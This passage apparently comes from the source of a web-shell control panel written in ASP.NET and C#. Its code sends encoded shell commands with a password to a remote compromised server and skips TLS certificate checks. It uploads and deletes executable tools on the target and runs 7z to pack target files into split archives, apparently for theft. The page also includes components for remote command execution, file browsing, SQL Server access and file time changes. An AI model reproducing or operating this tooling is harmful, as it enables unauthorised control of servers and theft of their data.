        //            name = "nbt";
        //            path = moduleFolder + "\\n.exe";
        //        }
        //        else if (mname == "mdlhb")
        //        {
        //            name = "hb";
        //            path = moduleFolder + "\\h.exe";
        //        }

        //        mfile.SaveAs(path);
        //        ret = "Module '" + name + "' installed successfuly.";
        //    }
        //    catch (Exception e)
        //    {
        //        ret = "Error : " + e.Message;
        //    }
        //    response(ret);
        //}
        void installModule(string moduleName)
        {
            string ret = "Error : -";

            try
            {
                string targetFileName = string.Empty;
                string filePath = Server.MapPath(string.Empty) + "\\files\\";

                filePath += ModuleFileName[moduleName].Value;
                targetFileName = ModuleFileNameTarget[moduleName].Value;

                if (!string.IsNullOrEmpty(targetFileName))
                {
                    List<KeyValuePair<string, string>> formData = new List<KeyValuePair<string, string>>();
                    formData.Add(new KeyValuePair<string, string>("uploadPath", moduleFolder + targetFileName));
                    formData.Add(new KeyValuePair<string, string>("m", ((int)method.upload).ToString()));
                    formData.Add(new KeyValuePair<string, string>("p", p));

                    using (Stream fStream = File.OpenRead(filePath))
                    {
                        ret = UploadFile(fStream, Path.GetFileName(filePath), "uploadFile", formData);
                        if (ret.Contains("successfully"))
                            ret = "Module '" + moduleFolder + targetFileName + "' installed successfuly.";
                    }
                }
                else
                    ret = "Error : Module name is invalid";
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        //void uninstallModule(string mname)
        //{
        //    string ret = "Error : -";
        //    try
        //    {
        //        string name = string.Empty;
        //        string path = string.Empty;
        //        if (mname == "mdl7z")
        //        {
        //            name = "7z";
        //            path = moduleFolder + "\\z.exe";
        //        }
        //        else if (mname == "mdlrx")
        //        {
        //            name = "rx";
        //            path = moduleFolder + "\\r.exe";
        //        }
        //        else if (mname == "mdlnbt")
        //        {
        //            name = "nbt";
        //            path = moduleFolder + "\\n.exe";
        //        }

        //        System.IO.File.Delete(path);
        //        ret = "Module '" + name + "' uninstalled successfuly.";
        //    }
        //    catch (Exception e)
        //    {
        //        ret = "Error : " + e.Message;
        //    }

        //    response(ret);
        //}
        void uninstallModule(string moduleName)
        {
            string ret = "Error : -";
            try
            {
                string modulePath = moduleFolder + ModuleFileNameTarget[moduleName].Value;
                SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("del \"{0}\"",modulePath))}
                });
                string dirModule = SendRequest(url, new NameValueCollection() {
                    { "m", tb(((int)method.command).ToString())},
                    { "p", tb(p)},
                    { "cmd", tb(string.Format("dir \"{0}\" 2>&1",modulePath))}
                });
                if (dirModule.Contains("File Not Found"))
                    ret = "Module '" + modulePath + "' uninstalled successfuly.";
                else
                    ret = "Error : Cannot uninstall module : " + modulePath;
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        #endregion

        void cmd7z(string clevel, string address7z, string files, string volumSize, string vMode, string exclude)
        {
            string ret = "Error : -";
            try
            {
                string exludeStr = string.Empty;
                if (!string.IsNullOrEmpty(exclude))
                {
                    string[] temp = exclude.Split(',');
                    foreach (string item in temp)
                    {
                        exludeStr += " -xr!" + item;
                    }
                }
                ret = SendRequest(url, new NameValueCollection() {
                { "m", tb(((int)method.command).ToString())},
                { "p", tb(p)},
                { "cmd", tb(string.Format("{0} {1} a \"{2}\" {3}{4}{5} 2>&1",
                    moduleFolder + ModuleFileNameTarget[ModuleName.mdl7z.ToString()].Value,
                    clevel,
                    address7z,
                    files,
                    (string.IsNullOrEmpty(volumSize) ? "" : "-v" + volumSize + vMode),
                    exludeStr
                    )
                )}
            });
            }
            catch (Exception e)
            {
                ret = "Error : " + e.Message;
            }
            responseAjax(ret);
        }
        string SendRequest(string url, NameValueCollection values)
        {
            string response = string.Empty;

            string param = string.Empty;

            foreach (var item in values.AllKeys)
            {
                if (!string.IsNullOrEmpty(param))
                    param += "&";
                param += item + "=" + System.Web.HttpUtility.UrlEncode(isAjax ? values[item] : tb(values[item]));
            }

            using (WebClient wc = new WebClient())
            {
                ServicePointManager.ServerCertificateValidationCallback = (a, b, c, d) => true;
                wc.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                response = fb(wc.UploadString(url, param));
            }

            return response;
        }
        public static void CreateEmptyFile(string filename)
        {
            File.Create(filename).Dispose();
        }
        string sizeFix(long size, bool round = false)
        {
            double s = size;
            if (s < 1024)
                return s + "B";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "KB";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "MB";
            s = s / 1024;
            if (s < 1024)
                return (round ? (int)s : Math.Round(s, 2)) + "GB";
            s = s / 1024;
            return (round ? (int)s : Math.Round(s, 2)) + "TB";
        }
        string timeFix(long msec)
        {
            double s = msec;
            if (s < 1000) return (int)s + " msec";
            s = s / 1000;
            if (s < 60) return (int)s + " sec";
            s = s / 60;
            if (s < 60) return (int)s + " min";
            s = s / 60;
            if (s < 24) return (int)s + " hour";
            s = s / 24;
            if (s < 365) return (int)s + " day";
            s = s / 365;
            return (int)s + " year";
        }
    </script>
</head>
<body>
    <div class="pusher contentPlace" style="/*flex-grow: 1; flex-direction: column; display: flex; */">
        <div id="header">
<!-- #include file ="js/components/loginbar.html" -->
<!-- #include file ="js/components/adminuserpass.html" -->
<!-- #include file ="js/components/maintab.html" -->
<!-- #include file ="js/components/cmd.html" -->
<!-- #include file ="js/components/explorer.html" -->
<!-- #include file ="js/components/targetcomputer.html" -->
<!-- #include file ="js/components/networkdownloader.html" -->
<!-- #include file ="js/components/upload.html" -->
<!-- #include file ="js/components/download.html" -->
<!-- #include file ="js/components/sqlserver.html" -->
<!-- #include file ="js/components/changetime.html" -->
<!-- #include file ="js/components/tardigrade.html" -->
        </div>
<!-- #include file ="js/components/log.html" -->
    </div>
<!-- #include file ="js/components/downloadbox.html" -->
<!-- #include file ="js/components/msgDeleteFile.html" -->
    <i title="Scroll Top" class="circular large link chevron circle up icon" style="right: 10px; bottom: 10px; position: fixed; z-index: 3333; background-color: #fff" onclick="$('html, body').animate({ scrollTop: 0 }, 500);"></i>
    <i title="Clear Terminal" class="circular large link paint brush icon" style="right: 65px; bottom: 10px; position: fixed; z-index: 3333; background-color: #fff" onclick="$('#log').text('');$('#tbMain').sticky('refresh');"></i>
    <script><%= SpecialScript %></script>
</body>
</html>
<!-- #include file ="js/components/includes.html" -->
